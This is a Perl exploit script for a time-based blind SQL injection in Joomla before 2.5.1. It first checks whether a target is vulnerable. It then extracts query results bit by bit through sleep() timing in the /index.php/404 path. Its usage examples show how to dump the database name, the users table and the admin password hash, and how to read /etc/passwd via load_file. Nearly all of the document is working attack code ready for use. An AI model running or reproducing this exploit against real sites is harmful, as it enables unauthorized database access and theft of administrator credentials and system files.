#!/usr/bin/perl
# Thu Mar 15 22:55:32 CET 2012 A. Ramos <aramosf()unsec.net>
# www.securitybydefault.com
# Joomla <2.5.1 time based sql injection - vuln by Colin Wong
#
# using sleep() and not benchmark(), change for < mysql 5.0.12
#
# 1.- Database name: database()
# 2.- Users data table name: (change 'joomla' for database() result)
#   select table_name from information_schema.tables where table_schema = "joomla" and table_name like "%_users"
# 3.- Admin password: (change zzz_users from previus sql query result)
#   select password from zzzz_users limit 1
 
 
 
use strict;
use LWP::UserAgent;
$| = 1;
 
 
my $url = $ARGV[0];
my $wtime = $ARGV[1];
my $sql = $ARGV[2];
 
unless ($ARGV[2]) {
 print "$0 <url> <wait time> <sql>\n";
 print "\texamples:\n";
 print "\t get admin password:\n";
 print "\t\t$0 http://host/joomla/ 3 'database()'\n";
 print "\t\t$0 http://host/joomla/ 3 'select table_name from information_schema.tables where table_schema=\"joomla\" and table_name like \"%25_users\"\'\n";
 print "\t\t$0 http://host/joomla/ 3 'select password from zzzz_users limit 1'\n";
 print "\t get file /etc/passwd\n";
 print "\t\t$0 http://host/joomla/ 3 'load_file(\"/etc/passwd\")'\n";
 exit 1;
}
 
my ($len,$sqldata);
 
my $ua = LWP::UserAgent->new;
$ua->timeout(60);
$ua->env_proxy;
 
my $stime = time();
my $res = $ua->get($url);
my $etime = time();
my $regrtt = $etime - $stime;
print "rtt: $regrtt secs\n";
print "vuln?: ";
 
my $sleep = $regrtt + $wtime;
$stime = time();
$res = $ua->get($url."/index.php/404' union select sleep($sleep) union select '1");
$etime = time();
my $rtt = $etime - $stime;
if ($rtt >= $regrtt + $wtime) { print "ok!\n"; } else { print "nope :(\n"; exit 1; }
 
 
my $lenoflen;
sub len {
 # length of length
 for (1..5) {
    my $sql=$_[0];
    $stime = time();
    $res = $ua->get($url."/index.php/404' union select if(length(length(($sql)))=$_,sleep($wtime),null) union select '1");
    $etime = time();
    my $rtt = $etime - $stime;
    if ($rtt >= $regrtt + $wtime) {
        $lenoflen = $_;
        last;
    }
 }
 for (1..$lenoflen) {
  my $ll;
  $ll=$_;
  for (0..9) {
    my $sql=$_[0];
    $stime = time();
    $res = $ua->get($url."/index.php/404' union select if(mid(length(($sql)),$ll,1)=$_,sleep($wtime),null) union select '1");
    $etime = time();
    my $rtt = $etime - $stime;
    if ($rtt >= $regrtt + $wtime) {
        $len .= $_;
    }
  }
 }
    return $len;
 
}
 
sub data {
 my $sql = $_[0];
 my $len = $_[1];
 my ($bit, $str, @byte);
 my $high = 128;
 
 for (1..$len) {
    my $c=8;
    @byte="";
    my $a=$_;
    for ($bit=1;$bit<=$high;$bit*=2) {
        $stime = time();
        # select if((ord(mid((load_file("/etc/passwd")),1,1)) & 64)=0,sleep(2),null) union select '1';
        $res = $ua->get($url."/index.php/404' union select if((ord(mid(($sql),$a,1)) & $bit)=0,sleep($wtime),null) union select '1");
        $etime = time();
        my $rtt = $etime - $stime;
        if ($rtt >= $regrtt + $wtime) {
            $byte[$c]="0";
        } else { $byte[$c]="1"; }
    $c--;
    }
    $str = join("",@byte);
    print pack("B*","$str");
  }
}
 
$len = len($sql);
print "$sql length: $len\n";
print "$sql data:\n\n";
data($sql,$len);

